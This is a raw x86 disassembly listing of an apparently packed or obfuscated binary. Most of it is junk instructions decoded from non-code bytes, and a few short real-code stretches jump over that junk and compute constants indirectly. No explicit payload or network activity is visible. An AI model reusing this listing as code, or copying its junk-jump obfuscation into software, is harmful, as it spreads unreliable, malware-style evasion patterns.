  410773:	xlat   BYTE PTR ds:[ebx]
  410774:	call   0xbde8:0x401e12d4
  41077b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41077c:	pop    edx
  41077d:	iret   
  41077e:	add    al,ah
  410780:	push   esi
  410781:	inc    esi
  410782:	xchg   ebp,eax
  410783:	pop    ebx
  410784:	pop    es
  410785:	in     al,0xa4
  410787:	fbld   TBYTE PTR [esi]
  410789:	(bad)  
  41078a:	push   ecx
  41078b:	jmp    0x4e59:0xce5619fc
  410792:	or     BYTE PTR [edi-0x71d30df4],cl
  410798:	jle    0x41078e
  41079a:	lods   al,BYTE PTR ds:[esi]
  41079b:	inc    esi
  41079c:	(bad)  
  41079d:	pop    ecx
  41079e:	mov    al,0x70
  4107a0:	inc    esi
  4107a1:	shl    bl,1
  4107a3:	inc    ecx
  4107a4:	lods   eax,DWORD PTR ds:[esi]
  4107a5:	jno    0x4107f6
  4107a7:	ret    
  4107a8:	sbb    cl,BYTE PTR [edi-0x2e9af41]
  4107ae:	xchg   edi,eax
  4107af:	(bad)  
  4107b0:	mov    al,ds:0xf94299e6
  4107b5:	ja     0x4107af
  4107b7:	push   ds
  4107b8:	test   eax,0xa4ef2ba9
  4107bd:	ret    0xa13
  4107c0:	test   BYTE PTR [edi+0x20c7bec4],ch
  4107c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107c7:	sbb    edx,DWORD PTR [edi-0x5137b1de]
  4107cd:	(bad)  
  4107ce:	mov    edi,0x17f9d044
  4107d3:	lds    ebp,FWORD PTR [eax+0x66f5d7cc]
  4107d9:	sar    bh,cl
  4107db:	mov    bh,0x3e
  4107dd:	push   eax
  4107de:	inc    ebx
  4107df:	pop    ebx
  4107e0:	lods   eax,DWORD PTR ds:[esi]
  4107e1:	popf   
  4107e2:	jp     0x410794
  4107e4:	pop    ss
  4107e5:	or     edx,ebx
  4107e7:	sbb    al,0x38
  4107e9:	mov    edi,0x9371706d
  4107ee:	mov    ds:0xc1884b68,eax
  4107f3:	call   0xe6a7:0xe3bcf024
  4107fa:	cmp    eax,0x8ac0e4a8
  4107ff:	mov    dl,0x50
  410801:	push   ecx
  410802:	shl    BYTE PTR [edx],0x65
  410805:	push   ebp
  410806:	sub    ah,BYTE PTR [ebx+0x22b305d3]
  41080c:	jns    0x4107c2
  41080e:	ins    BYTE PTR es:[edi],dx
  41080f:	push   esp
  410810:	in     eax,0xf
  410812:	add    esp,eax
  410814:	sub    eax,0xfe2ac40
  410819:	jb     0x41082d
  41081b:	pop    ebx
  41081c:	lahf   
  41081d:	jle    0x4107df
  41081f:	add    esp,0x76
  410822:	mov    dl,0x1f
  410824:	sbb    BYTE PTR [ecx-0x65],ch
  410827:	adc    dh,BYTE PTR ds:0x1736fcd3
  41082d:	and    ebp,ebx
  41082f:	cmp    edx,DWORD PTR [esi+0xe]
  410832:	adc    edx,0x4e
  410835:	jbe    0x410872
  410837:	mov    al,ds:0xdbad4dfa
  41083c:	inc    ecx
  41083d:	dec    ecx
  41083e:	cwde   
  41083f:	mov    ecx,0x6df67324
  410844:	or     BYTE PTR [ecx],bh
  410846:	cli    
  410847:	je     0x4108c8
  410849:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41084a:	lahf   
  41084b:	xchg   ebx,eax
  41084c:	fisub  DWORD PTR [ecx-0x53c7493d]
  410852:	add    al,0x66
  410854:	iret   
  410855:	shr    DWORD PTR [esi],1
  410857:	push   ds
  410858:	pop    es
  410859:	clc    
  41085a:	mov    ds:0xa8f0cc2,eax
  410860:	xor    al,0x5a
  410862:	xchg   ecx,eax
  410863:	pusha  
  410864:	mov    DWORD PTR [esi-0x74],esp
  410867:	in     eax,0x1c
  410869:	mov    ds:0xefe383d7,al
  41086e:	adc    dh,BYTE PTR [esi+eiz*1]
  410871:	in     al,0x81
  410873:	ss clc 
  410875:	and    ch,BYTE PTR ds:0x635a97fb
  41087b:	cwde   
  41087c:	push   esi
  41087d:	xor    eax,0xd3a7fc07
  410882:	in     eax,0x36
  410884:	jp     0x41081b
  410886:	lods   al,BYTE PTR fs:[esi]
  410888:	bound  esp,QWORD PTR [ecx-0x39]
  41088b:	aam    0x96
  41088d:	aad    0x61
  41088f:	mov    eax,ds:0x6a7a7e6
  410894:	mov    esp,0xc955c037
  410899:	push   esi
  41089a:	sub    dl,BYTE PTR [ebx]
  41089c:	es pop esp
  41089e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41089f:	je     0x410823
  4108a1:	and    esi,ebx
  4108a3:	lods   eax,DWORD PTR ds:[esi]
  4108a4:	pop    ss
  4108a5:	(bad)  
  4108a6:	arpl   di,sp
  4108a8:	mov    ds:0xf87e8fb5,eax
  4108ad:	cmp    dh,BYTE PTR [esi]
  4108af:	call   0x1b23:0x23af1dc9
  4108b6:	mov    BYTE PTR [ecx],bh
  4108b8:	sub    dh,BYTE PTR [ebx]
  4108ba:	lds    esi,FWORD PTR [edi+ebp*4-0x7c87d200]
  4108c1:	jle    0x4108fa
  4108c3:	dec    esp
  4108c4:	pop    ebp
  4108c5:	cli    
  4108c6:	and    BYTE PTR [esi-0x26],ch
  4108c9:	rcr    DWORD PTR [esp+ecx*4+0x4e],1
  4108cd:	push   ecx
  4108ce:	fs gs inc esi
  4108d1:	ins    BYTE PTR es:[edi],dx
  4108d2:	mov    eax,ds:0xadb5379e
  4108d7:	popa   
  4108d8:	ins    BYTE PTR es:[edi],dx
  4108d9:	fwait
  4108da:	rcl    esi,1
  4108dc:	test   al,0x78
  4108de:	test   BYTE PTR [ebx+edx*8+0x78],cl
  4108e2:	push   0xffffff81
  4108e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108e5:	repz inc eax
  4108e7:	dec    edi
  4108e8:	shr    DWORD PTR ds:0x85fe1745,0xa2
  4108ef:	cmp    cl,0x4c
  4108f2:	mov    eax,0x9640a3c7
  4108f7:	xor    eax,0xceeadb9e
  4108fc:	lahf   
  4108fd:	(bad)  
  4108fe:	or     DWORD PTR [edx],ecx
  410900:	xor    eax,DWORD PTR [edx]
  410902:	ins    DWORD PTR es:[edi],dx
  410903:	pop    edx
  410904:	sahf   
  410905:	(bad)  
  410907:	push   ss
  410908:	out    0xfa,al
  41090a:	and    al,0x18
  41090c:	mov    esp,0xf1dd8872
  410911:	jb     0x41090d
  410913:	fld    TBYTE PTR [edx]
  410915:	jbe    0x4108bc
  410917:	xchg   esp,eax
  410918:	xor    bh,BYTE PTR [ecx+ecx*1-0x52]
  41091c:	jne    0x410954
  41091e:	push   0xffffff86
  410920:	jnp    0x410915
  410922:	aad    0x59
  410924:	mul    BYTE PTR [edx+0x139b9e5e]
  41092a:	add    al,0xe1
  41092c:	aad    0x77
  41092e:	jmp    0xf60c:0x3a6cf03e
  410935:	loop   0x410915
  410937:	int    0xfb
  410939:	pop    ebx
  41093a:	icebp  
  41093b:	shl    ch,0x0
  41093e:	in     eax,dx
  41093f:	add    esi,0x6e
  410942:	dec    ebp
  410943:	inc    esp
  410944:	add    al,0x9f
  410946:	and    eax,0xeecfae6a
  41094b:	or     cl,dh
  41094d:	pop    ds
  41094e:	sub    al,0x21
  410950:	mov    cl,0x80
  410952:	dec    esi
  410953:	cmp    BYTE PTR [esi+ecx*2],0x67
  410957:	jg     0x4108eb
  410959:	imul   ecx,DWORD PTR ds:0x28375436,0xffffff87
  410960:	push   esi
  410961:	or     DWORD PTR [ebx+eax*4-0x41ee8812],0x5b85f452
  41096c:	cli    
  41096d:	dec    edx
  41096e:	and    eax,0x3dcaa94f
  410973:	fdivr  DWORD PTR [edi+0x2767c84c]
  410979:	add    edx,edi
  41097b:	xchg   ebx,eax
  41097c:	push   ecx
  41097d:	jb     0x41095f
  41097f:	dec    ebp
  410980:	push   es
  410981:	adc    bh,BYTE PTR [eax*8-0x7b3bc9a5]
  410988:	sub    eax,0xefd46401
  41098d:	loopne 0x41099a
  41098f:	aaa    
  410990:	sub    DWORD PTR [esi],esi
  410992:	std    
  410993:	loopne 0x410953
  410995:	or     bl,BYTE PTR [eax-0x5]
  410998:	gs dec esp
  41099a:	xchg   ecx,eax
  41099b:	gs mov dh,ch
  41099e:	dec    ebp
  41099f:	push   eax
  4109a0:	ficomp WORD PTR [edx]
  4109a2:	leave  
  4109a3:	imul   ebp,edi,0xc6cf39af
  4109a9:	mov    ebp,0x259bebb9
  4109ae:	shl    BYTE PTR ds:0x928fbec1,cl
  4109b4:	les    ecx,FWORD PTR [ebx+ebp*4]
  4109b7:	or     eax,0xd47a412
  4109bc:	les    ebx,FWORD PTR [eax+0x0]
  4109bf:	add    BYTE PTR [ecx+0x7a7af2],al
  4109c5:	add    BYTE PTR ds:0x5278,dh
  4109cb:	push   edx
  4109cc:	push   eax
  4109cd:	call   0x4220b4
  4109d2:	mov    DWORD PTR [esi],eax
  4109d4:	mov    DWORD PTR [ebp-0x20],0x3354
  4109db:	mov    DWORD PTR [ebp-0x1c],0x7d8c
  4109e2:	mov    DWORD PTR [ebp-0x18],0x3d36
  4109e9:	mov    DWORD PTR [ebp-0x14],0x51ef
  4109f0:	xor    edi,edi
  4109f2:	mov    DWORD PTR [ebp-0xc],0x3358
  4109f9:	push   0xc9f
  4109fe:	inc    edi
  4109ff:	mov    DWORD PTR [ebp-0x4],edi
  410a02:	mov    eax,DWORD PTR [ebp-0x18]
  410a05:	mov    ecx,DWORD PTR [ebp-0x14]
  410a08:	push   0x1c19
  410a0d:	push   ecx
  410a0e:	push   eax
  410a0f:	call   0x416c20
  410a14:	mov    ecx,DWORD PTR [ebp-0x20]
  410a17:	mov    ebx,DWORD PTR [ebp-0x1c]
  410a1a:	or     eax,ecx
  410a1c:	or     edx,ebx
  410a1e:	push   0x20fa
  410a23:	add    eax,0x7fac
  410a28:	push   0x1cd48ab
  410a2d:	adc    edx,0x133b
  410a33:	push   edx
  410a34:	push   eax
  410a35:	call   0x4220b4
  410a3a:	mov    ebx,DWORD PTR [ebp-0x4]
  410a3d:	lea    ecx,[eax-0x5d40]
  410a43:	xor    edx,edx
  410a45:	mov    eax,0x16c2
  410a4a:	div    ebx
  410a4c:	mov    edx,DWORD PTR [ebp-0xc]
  410a4f:	sub    eax,edx
  410a51:	mov    DWORD PTR [esi+eax*4+0x725c],ecx
  410a58:	mov    DWORD PTR [ebp-0x14],0x6af0
  410a5f:	jmp    0x410d3f
  410a64:	jno    0x410a88
  410a66:	xchg   DWORD PTR [esi+0x1a20b23a],esi
  410a6c:	mul    DWORD PTR [edx-0x6d]
  410a6f:	mov    esp,0x7edf2a91
  410a74:	jmp    0x1814:0x9a181888
  410a7b:	sbb    BYTE PTR [esi-0x5006c86d],bl
  410a81:	ins    BYTE PTR es:[edi],dx
  410a82:	add    ebx,DWORD PTR [ecx+eax*8]
  410a85:	mov    ch,0x7e
  410a87:	cmp    eax,DWORD PTR [eax-0x2d]
  410a8a:	xchg   esp,eax
  410a8b:	pop    esp
  410a8c:	cld    
  410a8d:	pop    es
  410a8e:	jns    0x410b06
  410a90:	out    0xf4,al
  410a92:	cwde   
  410a93:	sbb    al,0xd0
  410a95:	pop    eax
  410a96:	cmp    DWORD PTR [ebx],esi
  410a98:	jae    0x410a24
  410a9a:	push   eax
  410a9b:	add    dh,BYTE PTR [ecx-0x2c]
  410a9e:	(bad)  
  410a9f:	rol    al,cl
  410aa1:	loope  0x410a30
  410aa3:	outs   dx,DWORD PTR ds:[esi]
  410aa4:	fimul  DWORD PTR [esp+esi*8-0x53c39101]
  410aab:	xchg   ecx,eax
  410aac:	mov    ebx,0x89087500
  410ab1:	stos   DWORD PTR es:[edi],eax
  410ab2:	dec    edx
  410ab3:	into   
  410ab4:	push   esp
  410ab5:	xor    al,0x31
  410ab7:	add    eax,0xa92f26a2
  410abc:	pop    edx
  410abd:	int3   
  410abe:	push   DWORD PTR [esi-0x6d]
  410ac1:	push   es
  410ac2:	jp     0x410b18
  410ac4:	fnstsw WORD PTR [ebx+ecx*1-0x17]
  410ac8:	inc    ecx
  410ac9:	or     eax,DWORD PTR [eax]
  410acb:	push   ds
  410acc:	jecxz  0x410a74
  410ace:	lea    eax,[eax+0x61]
  410ad1:	xchg   ebp,eax
  410ad2:	mov    edi,0xd70d777c
  410ad7:	lock dec esp
  410ad9:	adc    BYTE PTR [edi+eiz*4+0x5c],al
  410add:	mov    ecx,0x5d46f6cd
  410ae2:	dec    DWORD PTR [ecx+0x46]
  410ae5:	stos   BYTE PTR es:[edi],al
  410ae6:	add    BYTE PTR [ebx+eax*4],cl
  410ae9:	cmp    DWORD PTR [edi-0x5],ebx
  410aec:	enter  0x775,0x42
  410af0:	sub    bh,cl
  410af2:	cmp    al,0x81
  410af4:	pop    edx
  410af5:	sub    al,0x5
  410af7:	pop    eax
  410af8:	add    ah,al
  410afa:	mov    bh,BYTE PTR [edi+0x5f68039b]
  410b00:	and    esi,DWORD PTR ds:0xdd4f8865
  410b06:	les    eax,FWORD PTR [edi-0x47]
  410b09:	hlt    
  410b0a:	ja     0x410b83
  410b0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b0d:	pop    ebp
  410b0e:	ret    0xf6ec
  410b11:	es dec edx
  410b13:	leave  
  410b14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b15:	add    ebx,DWORD PTR [ebx-0x58]
  410b18:	fs push ds
  410b1a:	dec    esp
  410b1b:	sbb    esp,edx
  410b1d:	nop
  410b1e:	pop    eax
  410b1f:	leave  
  410b20:	stos   BYTE PTR es:[edi],al
  410b21:	push   es
  410b22:	cmp    al,0x93
  410b24:	dec    ebp
  410b25:	mov    WORD PTR [edx+0x26],es
  410b28:	xchg   DWORD PTR [eax-0x60325c99],edx
  410b2e:	add    DWORD PTR [edx],edx
  410b30:	mov    DWORD PTR [ecx-0x1e965f5a],edi
  410b36:	sbb    DWORD PTR ds:[ebp-0x30cf28cc],ebx
  410b3d:	fbld   TBYTE PTR [edx+0x3f]
  410b40:	pusha  
  410b41:	call   0x4c10:0x40d9ff97
  410b48:	clc    
  410b49:	jo     0x410b34
  410b4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b4c:	dec    ecx
  410b4d:	xor    ebx,0xc66283dd
  410b53:	arpl   WORD PTR [eax],cx
  410b55:	mov    ebx,0xb6a94201
  410b5a:	in     eax,0x4e
  410b5c:	or     ebx,DWORD PTR [edx]
  410b5e:	cmp    dl,dl
  410b60:	cmp    eax,0xadf09161
  410b65:	jnp    0x410b6c
  410b67:	mov    dl,cl
  410b69:	add    cl,BYTE PTR [ebx]
  410b6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b6c:	cmp    DWORD PTR [ebp+0x5bbb5085],edi
  410b72:	xchg   ecx,esi
  410b74:	ret    0x2c42
  410b77:	xchg   ebp,eax
  410b78:	fadd   QWORD PTR [ebx]
  410b7a:	pop    ebp
  410b7b:	add    eax,0xb6da5800
  410b80:	sbb    DWORD PTR [eax+0x14],esp
  410b83:	jg     0x410bee
  410b85:	pop    eax
  410b86:	and    edx,DWORD PTR [esi]
  410b88:	mov    WORD PTR [edx],es
  410b8a:	pop    ebx
  410b8b:	push   cs
  410b8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b8d:	xchg   esi,eax
  410b8e:	sbb    bh,al
  410b90:	jge    0x410b5b
  410b92:	pop    es
  410b93:	retf   
  410b94:	mov    ds:0xd1d808fe,al
  410b99:	loopne 0x410b20
  410b9b:	outs   dx,BYTE PTR ds:[esi]
  410b9c:	xor    ebx,DWORD PTR [esi]
  410b9e:	inc    esp
  410b9f:	sub    dl,bh
  410ba1:	retf   0xbf03
  410ba4:	mov    edi,0x3fabbd6c
  410ba9:	xor    dl,al
  410bab:	xor    al,0x63
  410bad:	retf   0x5f5e
  410bb0:	xchg   edi,eax
  410bb1:	or     al,0x13
  410bb3:	xchg   esi,eax
  410bb4:	push   ebx
  410bb5:	jmp    0x4607:0xd1bf43e1
  410bbc:	mov    esi,0x9561a120
  410bc1:	shl    ah,0x2f
  410bc4:	pop    ss
  410bc5:	inc    eax
  410bc6:	leave  
  410bc7:	mov    ch,0x96
  410bc9:	hlt    
  410bca:	addr16 xor eax,0x8c2234d9
  410bd0:	cli    
  410bd1:	push   ebp
  410bd2:	jl     0x410c48
  410bd4:	push   es
  410bd5:	mov    es,WORD PTR [esi+0x47e46fe4]
  410bdb:	ror    DWORD PTR [esi+0x28ae895b],1
  410be1:	adc    al,0x10
  410be3:	or     BYTE PTR [esp+ebx*1-0x48],dl
  410be7:	aam    0xa1
  410be9:	out    dx,eax
  410bea:	clc    
  410beb:	in     al,0x92
  410bed:	push   DWORD PTR [eax]
  410bef:	jae    0x410c36
  410bf1:	daa    
  410bf2:	or     DWORD PTR [edi],edi
  410bf4:	into   
  410bf5:	jp     0xb5d2167f
  410bfb:	push   ebx
  410bfc:	scas   eax,DWORD PTR es:[edi]
  410bfd:	or     al,0x7a
  410bff:	fwait
  410c00:	jnp    0x410c0d
  410c02:	xchg   DWORD PTR [ebx],esp
  410c04:	imul   DWORD PTR [ebp+ebp*4+0x5d]
  410c08:	jge    0x410c74
  410c0a:	or     DWORD PTR [edx],0x2e
  410c0d:	pop    edx
  410c0e:	repnz retf 
  410c10:	(bad)  
  410c11:	loopne 0x410c1c
  410c13:	(bad)  
  410c14:	mov    cl,0x7e
  410c16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c17:	mov    ch,0x31
  410c19:	je     0x410bc4
  410c1b:	(bad)  
  410c1c:	out    dx,al
  410c1d:	sbb    BYTE PTR [esp+esi*1+0x3900389b],bh
  410c24:	push   0xaa1ee15f
  410c29:	inc    eax
  410c2a:	fsubr  QWORD PTR [esi+0x6c]
  410c2d:	(bad)  
  410c2f:	mov    ?,WORD PTR [edi+edi*1]
  410c32:	xchg   BYTE PTR [ecx+0x17],dl
  410c35:	xchg   edx,eax
  410c36:	pop    esi
  410c37:	add    BYTE PTR [edx-0x5e887a8f],cl
  410c3d:	lods   al,BYTE PTR ds:[esi]
  410c3e:	sbb    ecx,0x7c731a34
  410c44:	sbb    BYTE PTR [edi-0x26780a3],ch
  410c4a:	aaa    
  410c4b:	push   ss
  410c4c:	ins    DWORD PTR es:[edi],dx
  410c4d:	adc    eax,DWORD PTR [eax-0x31030533]
  410c53:	cmp    ebx,DWORD PTR [eax-0xdf4f73b]
  410c59:	pop    eax
  410c5a:	xor    BYTE PTR [eiz*8+0x15210a2f],0xe7
  410c62:	adc    bh,BYTE PTR [eax+esi*4]
  410c65:	xchg   esp,eax
  410c66:	rol    BYTE PTR [ebx-0x35],0x65
  410c6a:	ins    BYTE PTR es:[edi],dx
  410c6b:	rol    DWORD PTR [esi],cl
  410c6d:	dec    edi
  410c6e:	cmp    eax,0xf05719fe
  410c73:	xor    al,0xf8
  410c75:	gs retf 
  410c77:	xchg   BYTE PTR [eax+0x16],dl
  410c7a:	xchg   DWORD PTR [ebx-0x49c93912],ebp
  410c80:	retf   
  410c81:	cmp    esp,DWORD PTR [ecx-0x66bc301b]
  410c87:	in     eax,dx
  410c88:	push   cs
  410c89:	dec    edx
  410c8a:	xchg   BYTE PTR [esi+0x3],al
  410c8d:	dec    esp
  410c8e:	inc    ebx
  410c8f:	cdq    
  410c90:	stos   BYTE PTR es:[edi],al
  410c91:	xchg   edx,eax
  410c92:	(bad)  
  410c93:	pop    ebp
  410c94:	sbb    BYTE PTR [esp+edi*4-0x4ba8affe],bh
  410c9b:	sub    ebx,DWORD PTR [ebx+0x20]
  410c9e:	mov    ds:0x93afb5c7,al
  410ca3:	ins    BYTE PTR es:[edi],dx
  410ca4:	mov    ecx,0xed4adeed
  410ca9:	lock mov ch,0xa2
  410cac:	call   0x33d9:0xc4b4bf84
  410cb3:	mov    ebp,0x77f5f7c1
  410cb8:	mov    edx,0xe42788fe
  410cbd:	mov    eax,0x70be5909
  410cc2:	(bad)  
  410cc3:	jle    0x410c62
  410cc5:	aaa    
  410cc6:	push   cs
  410cc7:	jns    0x410c6b
  410cc9:	adc    al,0x5b
  410ccb:	jl     0x410cc4
  410ccd:	push   esp
  410cce:	fs call 0x5f23063
  410cd4:	inc    ecx
  410cd5:	sub    DWORD PTR [eax],esi
  410cd7:	rol    BYTE PTR [ebx+0x1d9e51bd],cl
  410cdd:	sub    eax,0xc43ff0f7
  410ce2:	push   edi
  410ce3:	adc    al,0x35
  410ce5:	in     al,dx
  410ce6:	mov    ?,esi
  410ce8:	jae    0x410cbd
  410cea:	popf   
  410ceb:	sbb    dh,ch
  410ced:	gs cmp al,0x5c
  410cf0:	out    0xf3,eax
  410cf2:	xchg   esp,eax
  410cf4:	scas   al,BYTE PTR es:[edi]
  410cf5:	xchg   ebx,eax
  410cf6:	outs   dx,DWORD PTR ds:[esi]
  410cf7:	dec    ebp
  410cf8:	pop    es
  410cf9:	js     0x410c86
  410cfb:	arpl   WORD PTR [eax-0x1e],ax
  410cfe:	mov    eax,0xeac9a02
  410d03:	xchg   BYTE PTR [edx],ah
  410d05:	test   al,0xf0
  410d07:	fidivr DWORD PTR [esi-0x3b4ceec8]
  410d0d:	pop    ebx
  410d0e:	or     DWORD PTR [eax+0x16f116f6],ebp
  410d14:	add    edi,DWORD PTR [edx+0x4360d2bb]
  410d1a:	push   cs
  410d1b:	xchg   esp,eax
  410d1c:	icebp  
  410d1d:	ret    0x1919
  410d20:	mov    eax,ds:0xcbfc0cb
  410d25:	or     al,0xc2
  410d27:	jge    0x410d0e
  410d29:	clc    
  410d2a:	dec    ebx
  410d2b:	shl    esp,1
  410d2d:	dec    esi
  410d2e:	push   esp
  410d2f:	push   edi
  410d30:	pop    esp
  410d31:	mov    ds:0x99e05a2d,eax
  410d36:	xchg   ebx,eax
  410d37:	push   eax
  410d38:	mov    bh,0x56
  410d3a:	leave  
  410d3b:	and    eax,DWORD PTR [esi]
  410d3d:	sti    
  410d3e:	popa   
  410d3f:	mov    DWORD PTR [ebp-0x4],edi
  410d42:	mov    DWORD PTR [ebp-0xc],0x2c8a
  410d49:	mov    ecx,DWORD PTR [ebp-0xc]
  410d4c:	mov    eax,0x4401
  410d51:	sub    eax,ecx
  410d53:	jmp    0x411033
  410d58:	test   eax,0x82368522
  410d5d:	mov    ss:0x6b32522,al
  410d63:	push   0x61
  410d65:	mov    bh,0x1d
  410d67:	jle    0x410dd6
  410d69:	sbb    BYTE PTR [eax],0x18
  410d6c:	call   0x1c63:0x5e181814
  410d73:	idiv   DWORD PTR [ebp+0x3f4eb538]
  410d79:	xor    al,0x38
  410d7b:	std    
  410d7c:	sub    DWORD PTR [ecx],0x9e49037e
  410d82:	ja     0x410d94
  410d84:	ficom  WORD PTR [edi+0x54]
  410d87:	sbb    BYTE PTR [edi-0x4fbf77a8],dh
  410d8d:	jbe    0x410dca
  410d8f:	call   0x48d23a33
  410d94:	ret    
  410d95:	sbb    al,0xff
  410d97:	into   
  410d98:	jmp    0xb63a:0x9cf18774
  410d9f:	out    0xab,eax
  410da1:	cmp    al,0x61
  410da3:	adc    DWORD PTR [edx+0x6b],esp
  410da6:	cs push esi
  410da8:	addr16 and eax,0xf6f03a7d
  410dae:	push   0x5c
  410db0:	test   eax,ebx
  410db2:	cmp    eax,0xa78ecdf3
  410db7:	fild   DWORD PTR [ecx+0xe15ecf2]
  410dbd:	or     BYTE PTR [ebx+0x77],0xec
  410dc1:	repz jg 0x410dfb
  410dc4:	cld    
  410dc5:	add    ah,BYTE PTR [edi-0x14cae44b]
  410dcb:	xor    ebp,ebx
  410dcd:	xor    BYTE PTR [eax+edx*1],0xcd
  410dd1:	inc    ecx
  410dd2:	dec    esi
  410dd3:	pop    edx
  410dd4:	push   ds
  410dd5:	mov    esp,0x15fc3609
  410dda:	add    al,0xc5
  410ddc:	out    0xbf,eax
  410dde:	fsub   QWORD PTR ds:0x99d64f61
  410de4:	jns    0x410db5
  410de6:	ja     0x410df0
  410de8:	fbstp  TBYTE PTR [edi]
  410dea:	cmp    eax,0xeb0d3bb8
  410def:	std    
  410df0:	push   es
  410df1:	xor    al,BYTE PTR [esi+0x7f]
  410df4:	fwait
  410df5:	ja     0x410d83
  410df7:	in     al,dx
  410df8:	pop    ebp
  410df9:	dec    esi
  410dfa:	fst    QWORD PTR [ebx+ecx*1+0x25fbc9aa]
  410e01:	lock out dx,eax
  410e03:	adc    al,0xd5
  410e05:	sbb    DWORD PTR [edi+0x35],0xe13d6c26
  410e0c:	(bad)  
  410e0d:	dec    ecx
  410e0e:	add    al,0x7a
  410e10:	dec    ebx
  410e11:	xor    BYTE PTR ds:0x4d927fe4,cl
  410e17:	aaa    
  410e18:	push   edi
  410e19:	push   ds
  410e1a:	pusha  
  410e1b:	add    DWORD PTR [edi+0x2c3f98fc],esp
  410e21:	or     al,0x8a
  410e23:	or     cl,BYTE PTR ds:[ebp+0xe]
  410e27:	sti    
  410e28:	cmp    BYTE PTR [eax+edi*4],cl
  410e2b:	ja     0x410e65
  410e2d:	sbb    edi,esi
  410e2f:	push   eax
  410e30:	fnstsw WORD PTR [esi]
  410e32:	push   ds
  410e33:	outs   dx,DWORD PTR ds:[esi]
  410e34:	xor    cl,BYTE PTR [esi+0x657c7dd8]
  410e3a:	adc    cl,BYTE PTR [edi-0x55]
  410e3d:	ins    DWORD PTR es:[edi],dx
  410e3e:	jae    0x410ea3
  410e40:	je     0x410e75
  410e42:	mov    bh,0xef
  410e44:	adc    dh,al
  410e46:	dec    ebx
  410e47:	xlat   BYTE PTR ds:[ebx]
  410e48:	jnp    0x410eb3
  410e4a:	shl    BYTE PTR [ecx],0x9d
  410e4d:	popf   
  410e4e:	sub    bh,BYTE PTR [edx]
  410e50:	pop    ss
  410e51:	pop    ebp
  410e52:	push   ebx
  410e53:	ds or  ch,BYTE PTR cs:[eax+0x52]
  410e58:	pop    ecx
  410e59:	ss push 0xfb52403c
  410e5f:	cmp    esi,DWORD PTR [edi]
  410e61:	adc    edi,DWORD PTR [eax-0x49]
  410e64:	jl     0x410e38
  410e66:	loop   0x410ea1
  410e68:	outs   dx,DWORD PTR ds:[esi]
  410e69:	adc    DWORD PTR [eax-0x3c],0xd3897979
  410e70:	in     eax,dx
  410e71:	pop    es
  410e72:	jb     0x410e19
  410e74:	dec    esi
  410e75:	in     al,0xa
  410e77:	imul   ecx,DWORD PTR [ebx-0x472e2ccf],0xffffffbf
  410e7e:	jb     0x410e55
  410e80:	in     al,0x69
  410e82:	push   ecx
  410e83:	nop
  410e84:	dec    eax
  410e85:	xlat   BYTE PTR ds:[ebx]
  410e86:	xchg   BYTE PTR [ebx+0x5067dd89],bl
  410e8c:	adc    eax,0xd9383334
  410e91:	scas   al,BYTE PTR es:[edi]
  410e92:	mov    al,0xc5
  410e94:	sbb    DWORD PTR [ebp-0x3cacccdb],eax
  410e9a:	push   eax
  410e9b:	push   0xffffffdd
  410e9d:	or     eax,0x35209e02
  410ea2:	xchg   ecx,eax
  410ea3:	scas   eax,DWORD PTR es:[edi]
  410ea4:	or     eax,0x39c1d4af
  410ea9:	inc    esp
  410eaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410eab:	ja     0x410ebb
  410ead:	pop    edx
  410eae:	out    0x3f,eax
  410eb0:	loope  0x410e76
  410eb2:	mov    bh,0x89
  410eb4:	js     0x410e63
  410eb6:	ret    
  410eb7:	fsubr  QWORD PTR [edx-0x51]
  410eba:	or     DWORD PTR [ecx],ebx
  410ebc:	retf   0xa95b
  410ebf:	pop    es
  410ec0:	mov    ds,WORD PTR [edi+0x759d5667]
  410ec6:	pop    ds
  410ec7:	xor    eax,0x62db5d63
  410ecc:	jmp    0x335d:0xc8562faf
  410ed3:	pop    eax
  410ed4:	cld    
  410ed5:	hlt    
  410ed6:	cmp    dl,dl
  410ed8:	cli    
  410ed9:	stos   DWORD PTR es:[edi],eax
  410eda:	cmp    eax,0x3548bd7
  410edf:	jl     0x410ea7
  410ee1:	push   es
  410ee2:	push   ds
  410ee3:	adc    bh,dl
  410ee5:	mov    DWORD PTR [ecx-0x64ea25c5],0x36003e7
  410eef:	das    
  410ef0:	out    dx,eax
  410ef1:	or     eax,0x76aae596
  410ef6:	cmp    edx,DWORD PTR [edx+0x6]
  410ef9:	dec    ebx
  410efa:	lock cmp ebx,DWORD PTR [ebx+0xe24dc0a]
  410f01:	pop    ecx
  410f02:	aaa    
  410f03:	inc    ecx
  410f04:	push   esi
  410f05:	mov    cl,0x92
  410f07:	repnz imul ebx,DWORD PTR [eax],0xfffffff0
  410f0b:	mov    bl,0xd3
  410f0d:	stos   BYTE PTR es:[edi],al
  410f0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f0f:	inc    ebp
  410f10:	lods   al,BYTE PTR ds:[esi]
  410f11:	test   BYTE PTR [ebx-0x13749fe8],bl
  410f17:	mov    DWORD PTR ds:0x2f985be2,esp
  410f1d:	mov    eax,ds:0x2950d14a
  410f22:	mov    esi,0x3071ea48
  410f27:	rcl    BYTE PTR [eax+0x7af79f03],1
  410f2d:	dec    edi
  410f2e:	mov    edi,0x975b4bce
  410f33:	cmp    edx,DWORD PTR [edi]
  410f35:	inc    ebp
  410f36:	adc    bh,BYTE PTR ds:[ebx]
  410f39:	jne    0x410ed0
  410f3b:	cmp    eax,0xe5dd7b4f
  410f40:	jmp    0x50145b5b
  410f45:	pop    esp
  410f46:	jb     0x410f64
  410f48:	sub    BYTE PTR [ebx+eax*4-0x7dbb96b2],0xac
  410f50:	cli    
  410f51:	sub    DWORD PTR [edx-0x65],ebx
  410f54:	cmc    
  410f55:	add    dl,BYTE PTR [ebx+0x22]
  410f58:	into   
  410f59:	xchg   BYTE PTR [edi+0x23],ch
